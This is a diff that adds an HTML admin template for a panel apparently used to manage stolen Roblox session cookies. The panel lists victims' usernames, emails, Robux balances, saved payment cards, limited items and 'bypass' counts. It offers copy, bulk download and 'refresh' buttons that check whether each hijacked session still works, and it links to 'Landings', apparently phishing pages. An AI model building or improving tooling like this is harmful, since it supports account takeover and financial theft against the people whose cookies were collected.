@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookies - {{ APP_NAME }} Admin</title>
+    <link rel="icon" href="/static/logo.png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(16px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes orbFloat {
+            0% { transform: translate(0, 0) scale(1); }
+            33% { transform: translate(30px, -20px) scale(1.05); }
+            66% { transform: translate(-20px, 15px) scale(0.95); }
+            100% { transform: translate(0, 0) scale(1); }
+        }
+
+        @keyframes slideInRight {
+            from { transform: translateX(120px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        @keyframes slideOutRight {
+            from { transform: translateX(0); opacity: 1; }
+            to { transform: translateX(120px); opacity: 0; }
+        }
+
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background: #060608;
+            min-height: 100vh;
+            color: #e0e0e5;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: -20%;
+            left: -10%;
+            width: 500px;
+            height: 500px;
+            background: radial-gradient(circle, rgba(192,192,200,0.03) 0%, transparent 70%);
+            border-radius: 50%;
+            animation: orbFloat 20s ease-in-out infinite;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            bottom: -15%;
+            right: -10%;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(192,192,200,0.02) 0%, transparent 70%);
+            border-radius: 50%;
+            animation: orbFloat 25s ease-in-out infinite reverse;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .navbar {
+            background: rgba(6,6,8,0.7);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border-bottom: 1px solid rgba(255,255,255,.05);
+            padding: 0 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 64px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .navbar-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #e0e0e5;
+            letter-spacing: -0.3px;
+        }
+
+        .navbar-brand svg {
+            width: 22px;
+            height: 22px;
+            stroke: #c0c0c8;
+        }
+
+        .navbar-menu {
+            display: flex;
+            gap: 4px;
+            align-items: center;
+        }
+
+        .navbar-menu a {
+            color: #5a5a65;
+            text-decoration: none;
+            padding: 8px 16px;
+            border-radius: 8px;
+            transition: all 0.3s cubic-bezier(0.16,1,0.3,1);
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .navbar-menu a:hover {
+            color: #e0e0e5;
+            background: rgba(255,255,255,.04);
+        }
+
+        .navbar-menu a.active {
+            color: #c0c0c8;
+            background: rgba(255,255,255,.06);
+        }
+
+        .logout-btn {
+            color: #5a5a65 !important;
+            margin-left: 12px;
+            border-left: 1px solid rgba(255,255,255,.05);
+            padding-left: 20px !important;
+        }
+
+        .logout-btn:hover {
+            color: #c0c0c8 !important;
+        }
+
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 32px 24px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .page-header {
+            margin-bottom: 28px;
+        }
+
+        .page-header h1 {
+            font-size: 26px;
+            color: #e0e0e5;
+            margin-bottom: 6px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+
+        .page-header p {
+            color: #5a5a65;
+            font-size: 14px;
+        }
+
+        .table-container {
+            background: #0d0d10;
+            border: 1px solid rgba(255,255,255,.05);
+            border-radius: 12px;
+            overflow: hidden;
+            opacity: 0;
+            animation: fadeIn 0.5s cubic-bezier(0.16,1,0.3,1) 0.1s forwards;
+            transition: all 0.3s cubic-bezier(0.16,1,0.3,1);
+        }
+
+        .table-container:hover {
+            border-color: rgba(255,255,255,.12);
+            box-shadow: 0 8px 32px rgba(0,0,0,.3);
+        }
+
+        .table-header {
+            padding: 22px 28px;
+            border-bottom: 1px solid rgba(255,255,255,.05);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .table-header-left h2 {
+            font-size: 16px;
+            color: #e0e0e5;
+            margin-bottom: 4px;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+        }
+
+        .table-header-left p {
+            font-size: 13px;
+            color: #5a5a65;
+        }
+
+        .table-actions {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .selected-count {
+            font-size: 13px;
+            color: #5a5a65;
+            padding: 8px 14px;
+            background: rgba(255,255,255,.03);
+            border-radius: 8px;
+            display: none;
+            font-weight: 500;
+        }
+
+        .selected-count.active {
+            display: block;
+            color: #c0c0c8;
+        }
+
+        .download-btn {
+            background: linear-gradient(135deg,#1a1a20,#2a2a32);
+            color: #e0e0e5;
+            border: 1px solid rgba(255,255,255,.1);
+            padding: 9px 18px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.16,1,0.3,1);
+            display: none;
+            font-family: 'Inter', system-ui, sans-serif;
+        }
+
+        .download-btn.active {
+            display: block;
+        }
+
+        .download-btn:hover {
+            border-color: rgba(255,255,255,.2);
+            box-shadow: 0 8px 32px rgba(0,0,0,.3);
+            transform: translateY(-1px);
+        }
+
+        .checkbox-cell {
+            width: 40px;
+        }
+
+        .checkbox-cell input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+            accent-color: #808090;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        thead {
+            background: rgba(255,255,255,.02);
+        }
+
+        th {
+            padding: 13px 16px;
+            text-align: left;
+            font-weight: 500;
+            color: #5a5a65;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+
+        td {
+            padding: 15px 16px;
+            border-bottom: 1px solid rgba(255,255,255,.03);
+            font-size: 13px;
+            color: #5a5a65;
+        }
+
+        tr {
+            transition: all 0.3s cubic-bezier(0.16,1,0.3,1);
+        }
+
+        tr:hover {
+            background: rgba(255,255,255,.02);
+        }
+
+        .selectable-row {
+            cursor: pointer;
+            user-select: text;
+        }
+
+        .selectable-row.selected {
+            background: rgba(255,255,255,.03);
+        }
+        .selectable-row.has-billing {
+            background: rgba(251,191,36,.04);
+        }
+        .selectable-row.has-billing:hover {
+            background: rgba(251,191,36,.07) !important;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: 600;
+            margin-right: 4px;
+            letter-spacing: 0.3px;
+        }
+
+        .badge-premium {
+            background: rgba(200,175,55,.1);
+            color: #c8af37;
+            border: 1px solid rgba(200,175,55,.2);
+        }
+
+        .badge-headless {
+            background: rgba(180,130,210,.1);
+            color: #b482d2;
+            border: 1px solid rgba(180,130,210,.2);
+        }
+
+        .badge-korblox {
+            background: rgba(100,160,255,.1);
+            color: #64a0ff;
+            border: 1px solid rgba(100,160,255,.2);
+        }
+
+        .pagination {
+            padding: 20px 28px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid rgba(255,255,255,.05);
+        }
+
+        .pagination-info {
+            color: #5a5a65;
+            font-size: 13px;
+        }
+
+        .pagination-buttons {
+            display: flex;
+            gap: 6px;
+        }
+
+        .pagination-buttons a {
+            padding: 7px 14px;
+            background: rgba(255,255,255,.03);
+            border: 1px solid rgba(255,255,255,.05);
+            border-radius: 8px;
+            text-decoration: none;
+            color: #5a5a65;
+            font-size: 13px;
+            font-weight: 500;
+            transition: all 0.3s cubic-bezier(0.16,1,0.3,1);
+        }
+
+        .pagination-buttons a:hover {
+            border-color: rgba(255,255,255,.12);
+            color: #e0e0e5;
+            box-shadow: 0 4px 16px rgba(0,0,0,.2);
+        }
+
+        .pagination-buttons a.active {
+            background: rgba(255,255,255,.08);
+            color: #e0e0e5;
+            border-color: rgba(255,255,255,.12);
+        }
+
+        .pagination-buttons a.disabled {
+            opacity: 0.25;
+            pointer-events: none;
+        }
+
+        .cookie-cell {
+            max-width: 350px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            font-family: 'SF Mono', 'Fira Code', 'Courier New', monospace;
+            font-size: 11px;
+            background: rgba(255,255,255,.03);
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            color: #5a5a65;
+            transition: all 0.3s cubic-bezier(0.16,1,0.3,1);
+            border: 1px solid transparent;
+        }
+
+        .cookie-cell:hover {
+            background: rgba(255,255,255,.06);
+            color: #c0c0c8;
+            border-color: rgba(255,255,255,.1);
+        }
+
+        .copy-notification {
+            position: fixed;
+            top: 24px;
+            right: 24px;
+            background: #0d0d10;
+            color: #c0c0c8;
+            padding: 14px 24px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 600;
+            z-index: 1000;
+            border: 1px solid rgba(255,255,255,.1);
+            box-shadow: 0 8px 32px rgba(0,0,0,.4);
+            opacity: 0;
+            transform: translateX(120px);
+            pointer-events: none;
+            transition: none;
+        }
+
+        .copy-notification.show {
+            animation: slideInRight 0.4s cubic-bezier(0.16,1,0.3,1) forwards;
+        }
+
+        .copy-notification.hide {
+            animation: slideOutRight 0.3s cubic-bezier(0.16,1,0.3,1) forwards;
+        }
+
+        .stat-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            font-size: 12px;
+            color: #5a5a65;
+        }
+
+        .no-data {
+            padding: 60px;
+            text-align: center;
+            color: #5a5a65;
+            font-size: 14px;
+        }
+
+        @media (max-width: 768px) {
+            .navbar {
+                padding: 0 16px;
+            }
+            .navbar-menu a {
+                padding: 6px 10px;
+                font-size: 12px;
+            }
+            .container {
+                padding: 20px 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="navbar-brand">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="2" y1="12" x2="22" y2="12"></line>
+                <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
+            </svg>
+            <span>{{ APP_NAME }} Admin</span>
+        </div>
+        <div class="navbar-menu">
+            <a href="{{ url_for('admin_dashboard') }}">Dashboard</a>
+            <a href="{{ url_for('admin_cookies') }}" class="active">Cookies</a>
+            <a href="{{ url_for('admin_landings') }}">Landings</a>
+            <a href="{{ url_for('admin_settings') }}">Settings</a>
+            <form method="POST" action="{{ url_for('admin_logout') }}" style="display:inline"><button type="submit" class="logout-btn" style="background:none;border:none;cursor:pointer;font:inherit">Logout</button></form>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="page-header">
+            <h1>Valid Cookies</h1>
+            <p>All collected valid cookies database</p>
+        </div>
+
+        <div class="table-container">
+            <div class="table-header">
+                <div class="table-header-left">
+                    <h2>Cookies Database</h2>
+                    <p>Total: {{ data.total }} | Page {{ data.page }} of {{ data.total_pages }}</p>
+                </div>
+                <div class="table-actions">
+                    <span class="selected-count" id="selectedCount">0 selected</span>
+                    <button class="download-btn" id="downloadBtn" onclick="downloadSelected()">Download Selected</button>
+                    <button class="download-btn" id="deleteBtn" onclick="deleteSelected()" style="background:linear-gradient(135deg,#1a0d0d,#2a1010);border-color:rgba(255,80,80,.15);color:#ff6666;">Delete Selected</button>
+                    <button class="download-btn" style="display:block" onclick="downloadAll()">Download All</button>
+                    <button class="download-btn" style="display:block;background:linear-gradient(135deg,#0d1a0d,#102a10);border-color:rgba(80,255,80,.15);color:#66ff66;" onclick="refreshAll()">Refresh All</button>
+                    <button class="download-btn" style="display:block;background:linear-gradient(135deg,#1a0d0d,#2a1010);border-color:rgba(255,80,80,.15);color:#ff6666;" onclick="clearAll()">Clear All</button>
+                </div>
+            </div>
+
+            {% if data.cookies %}
+            <table>
+                <thead>
+                    <tr>
+                        <th class="checkbox-cell">
+                            <input type="checkbox" id="selectAll" onchange="toggleSelectAll(this)">
+                        </th>
+                        <th>ID</th>
+                        <th>Username</th>
+                        <th>User ID</th>
+                        <th>Email</th>
+                        <th>Robux</th>
+                        <th>All Time R$</th>
+                        <th style="color:#fbbf24;border-bottom:2px solid rgba(251,191,36,.3)">Cards</th>
+                        <th>RAP</th>
+                        <th>Status</th>
+                        <th>Friends</th>
+                        <th>Date</th>
+                        <th>Alive</th>
+                        <th>Bypasses</th>
+                        <th>Cookie</th>
+                        <th></th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for cookie in data.cookies %}
+                    <tr class="selectable-row{% if cookie.payment_methods > 0 %} has-billing{% endif %}">
+                        <td class="checkbox-cell">
+                            <input type="checkbox" class="cookie-checkbox"
+                                   data-id="{{ cookie.id }}"
+                                   data-cookie="{{ cookie.cookie_formatted }}"
+                                   data-username="{{ cookie.username }}"
+                                   onchange="updateSelection()">
+                        </td>
+                        <td>#{{ cookie.id }}</td>
+                        <td>
+                            <strong style="color: #e0e0e5;">{{ cookie.username }}</strong>
+                            {% if cookie.display_name != cookie.username %}
+                            <br><small style="color: #5a5a65;">{{ cookie.display_name }}</small>
+                            {% endif %}
+                        </td>
+                        <td>{{ cookie.user_id }}</td>
+                        <td><small>{{ cookie.email }}</small></td>
+                        <td><strong style="color: #c0c0c8;">{{ "{:,}".format(cookie.robux) }}</strong> R$</td>
+                        <td><strong style="color: #c0c0c8;">{{ "{:,}".format(cookie.alltime_robux) }}</strong></td>
+                        <td>
+                            {% if cookie.payment_methods > 0 %}
+                            <span style="display:inline-flex;align-items:center;gap:5px;background:rgba(251,191,36,.12);border:1px solid rgba(251,191,36,.35);color:#fbbf24;padding:3px 10px;border-radius:6px;font-size:12px;font-weight:700;">
+                                <svg style="width:12px;height:12px;stroke:#fbbf24;fill:none;stroke-width:2" viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2"/><path d="M1 10h22"/></svg>{{ cookie.payment_methods }}
+                            </span>
+                            {% else %}
+                            <span style="color:#3a3a45;font-size:12px">—</span>
+                            {% endif %}
+                        </td>
+                        <td>{{ "{:,}".format(cookie.rap) }}</td>
+                        <td>
+                            {% if cookie.premium %}
+                            <span class="badge badge-premium">PREMIUM</span>
+                            {% endif %}
+                            {% if cookie.headless %}
+                            <span class="badge badge-headless">HEADLESS</span>
+                            {% endif %}
+                            {% if cookie.korblox %}
+                            <span class="badge badge-korblox">KORBLOX</span>
+                            {% endif %}
+                        </td>
+                        <td>
+                            <div class="stat-badge">{{ cookie.friends_count }}</div>
+                            <div class="stat-badge">{{ cookie.followers_count }}</div>
+                        </td>
+                        <td><small>{{ cookie.timestamp }}</small></td>
+                        <td>
+                            {% if cookie.is_active %}
+                            <span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#4ade80;box-shadow:0 0 6px rgba(74,222,128,.5);" title="Active{% if cookie.last_checked_at %} — checked {{ cookie.last_checked_at }}{% endif %}"></span>
+                            {% else %}
+                            <span style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#f87171;box-shadow:0 0 6px rgba(248,113,113,.5);" title="Dead{% if cookie.last_checked_at %} — checked {{ cookie.last_checked_at }}{% endif %}"></span>
+                            {% endif %}
+                        </td>
+                        <td>
+                            {% if cookie.bypass_count > 0 %}
+                            <span style="font-size:11px;color:#a78bfa;" title="Last: {{ cookie.last_bypass_at or '—' }}">{{ cookie.bypass_count }}x</span>
+                            {% else %}
+                            <span style="color:#3a3a45;font-size:11px">—</span>
+                            {% endif %}
+                        </td>
+                        <td>
+                            <div class="cookie-cell" data-value="{{ cookie.cookie_formatted }}" onclick="copyCookieFromEl(event, this)" title="Click to copy cookie">
+                                {{ cookie.cookie_formatted[:50] }}...
+                            </div>
+                        </td>
+                        <td>
+                            <button onclick="refreshCookie({{ cookie.id }}, this)" style="background:none;border:1px solid rgba(255,255,255,.08);border-radius:6px;padding:4px 8px;cursor:pointer;color:#5a5a65;font-size:11px;transition:all .2s;" title="Refresh this cookie" onmouseover="this.style.borderColor='rgba(74,222,128,.3)';this.style.color='#4ade80'" onmouseout="this.style.borderColor='rgba(255,255,255,.08)';this.style.color='#5a5a65'">
+                                ↻
+                            </button>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+
+            <div class="pagination">
+                <div class="pagination-info">
+                    Showing {{ ((data.page - 1) * data.per_page + 1) }} - {{ min(data.page * data.per_page, data.total) }} of {{ data.total }}
+                </div>
+                <div class="pagination-buttons">
+                    {% if data.page > 1 %}
+                    <a href="{{ url_for('admin_cookies', page=1) }}">First</a>
+                    <a href="{{ url_for('admin_cookies', page=data.page-1) }}">Previous</a>
+                    {% else %}
+                    <a class="disabled">First</a>
+                    <a class="disabled">Previous</a>
+                    {% endif %}
+
+                    {% for p in range(max(1, data.page - 2), min(data.total_pages, data.page + 2) + 1) %}
+                    <a href="{{ url_for('admin_cookies', page=p) }}" class="{% if p == data.page %}active{% endif %}">{{ p }}</a>
+                    {% endfor %}
+
+                    {% if data.page < data.total_pages %}
+                    <a href="{{ url_for('admin_cookies', page=data.page+1) }}">Next</a>
+                    <a href="{{ url_for('admin_cookies', page=data.total_pages) }}">Last</a>
+                    {% else %}
+                    <a class="disabled">Next</a>
+                    <a class="disabled">Last</a>
+                    {% endif %}
+                </div>
+            </div>
+            {% else %}
+            <div class="no-data">
+                No cookies collected yet
+            </div>
+            {% endif %}
+        </div>
+    </div>
+
+    <div class="copy-notification" id="copyNotification">
+        Cookie copied to clipboard
+    </div>
+
+    <script>
+        function showNotification(text) {
+            var notification = document.getElementById('copyNotification');
+            notification.textContent = text;
+            notification.className = 'copy-notification show';
+
+            setTimeout(function() {
+                notification.className = 'copy-notification hide';
+            }, 2500);
+
+            setTimeout(function() {
+                notification.className = 'copy-notification';
+            }, 2800);
+        }
+
+        function copyCookieFromEl(event, el) {
+            event.stopPropagation();
+            var cookie = el.getAttribute('data-value');
+            navigator.clipboard.writeText(cookie).then(function() {
+                showNotification('Cookie copied to clipboard');
+            });
+        }
+
+        function updateSelection() {
+            var checkboxes = document.querySelectorAll('.cookie-checkbox:checked');
+            var count = checkboxes.length;
+            var countEl = document.getElementById('selectedCount');
+            var btnEl = document.getElementById('downloadBtn');
+
+            var delBtn = document.getElementById('deleteBtn');
+            if (count > 0) {
+                countEl.textContent = count + ' selected';
+                countEl.classList.add('active');
+                btnEl.classList.add('active');
+                delBtn.classList.add('active');
+            } else {
+                countEl.classList.remove('active');
+                btnEl.classList.remove('active');
+                delBtn.classList.remove('active');
+            }
+
+            var allCheckboxes = document.querySelectorAll('.cookie-checkbox');
+            var selectAllCheckbox = document.getElementById('selectAll');
+            selectAllCheckbox.checked = count === allCheckboxes.length;
+        }
+
+        function toggleSelectAll(checkbox) {
+            var checkboxes = document.querySelectorAll('.cookie-checkbox');
+            checkboxes.forEach(function(cb) {
+                cb.checked = checkbox.checked;
+            });
+            updateSelection();
+        }
+
+        function downloadSelected() {
+            var checkboxes = document.querySelectorAll('.cookie-checkbox:checked');
+            if (checkboxes.length === 0) return;
+
+            var content = '';
+            checkboxes.forEach(function(cb) {
+                var cookie = cb.dataset.cookie;
+                content += cookie + '\n';
+            });
+
+            var blob = new Blob([content], { type: 'text/plain' });
+            var url = window.URL.createObjectURL(blob);
+            var a = document.createElement('a');
+            a.href = url;
+            a.download = 'cookies_' + new Date().getTime() + '.txt';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+
+            showNotification(checkboxes.length + ' cookies downloaded');
+
+            checkboxes.forEach(function(cb) { cb.checked = false; });
+            document.getElementById('selectAll').checked = false;
+            updateSelection();
+        }
+
+        function downloadAll() {
+            window.location.href = '{{ url_for("admin_download_all_cookies") }}';
+        }
+
+        var CSRF_TOKEN = '{{ csrf_token() }}';
+
+        function deleteSelected() {
+            var checkboxes = document.querySelectorAll('.cookie-checkbox:checked');
+            if (checkboxes.length === 0) return;
+            if (!confirm('Delete ' + checkboxes.length + ' cookies?')) return;
+
+            var ids = [];
+            checkboxes.forEach(function(cb) { ids.push(cb.dataset.id); });
+
+            var form = new FormData();
+            form.append('csrf_token', CSRF_TOKEN);
+            ids.forEach(function(id) { form.append('ids[]', id); });
+
+            fetch('{{ url_for("admin_delete_cookies") }}', { method: 'POST', body: form })
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    showNotification('Deleted ' + d.deleted + ' cookies');
+                    setTimeout(function() { location.reload(); }, 800);
+                });
+        }
+
+        function clearAll() {
+            if (!confirm('Clear ALL cookies from database?')) return;
+
+            var form = new FormData();
+            form.append('csrf_token', CSRF_TOKEN);
+
+            fetch('{{ url_for("admin_clear_cookies") }}', { method: 'POST', body: form })
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    showNotification('Cleared ' + d.deleted + ' cookies');
+                    setTimeout(function() { location.reload(); }, 800);
+                });
+        }
+
+        function refreshCookie(id, btn) {
+            btn.disabled = true;
+            btn.textContent = '...';
+            btn.style.color = '#fbbf24';
+
+            var form = new FormData();
+            form.append('csrf_token', CSRF_TOKEN);
+
+            fetch('{{ admin_url }}/cookies/refresh/' + id, { method: 'POST', body: form })
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    var s = d.status || 'unknown';
+                    if (s === 'alive' || s.indexOf('bypassed') !== -1) {
+                        btn.style.color = '#4ade80';
+                        btn.textContent = '✓';
+                        showNotification(d.username + ': ' + s + (d.robux != null ? ' (R$ ' + d.robux + ')' : ''));
+                    } else {
+                        btn.style.color = '#f87171';
+                        btn.textContent = '✗';
+                        showNotification(d.username + ': ' + s);
+                    }
+                    setTimeout(function() { location.reload(); }, 2000);
+                })
+                .catch(function() {
+                    btn.style.color = '#f87171';
+                    btn.textContent = '!';
+                });
+        }
+
+        function refreshAll() {
+            if (!confirm('Refresh all active cookies? This runs in background.')) return;
+
+            var form = new FormData();
+            form.append('csrf_token', CSRF_TOKEN);
+
+            fetch('{{ admin_url }}/cookies/refresh-all', { method: 'POST', body: form })
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    showNotification('Refresh started in background');
+                });
+        }
+    </script>
+</body>
+</html>
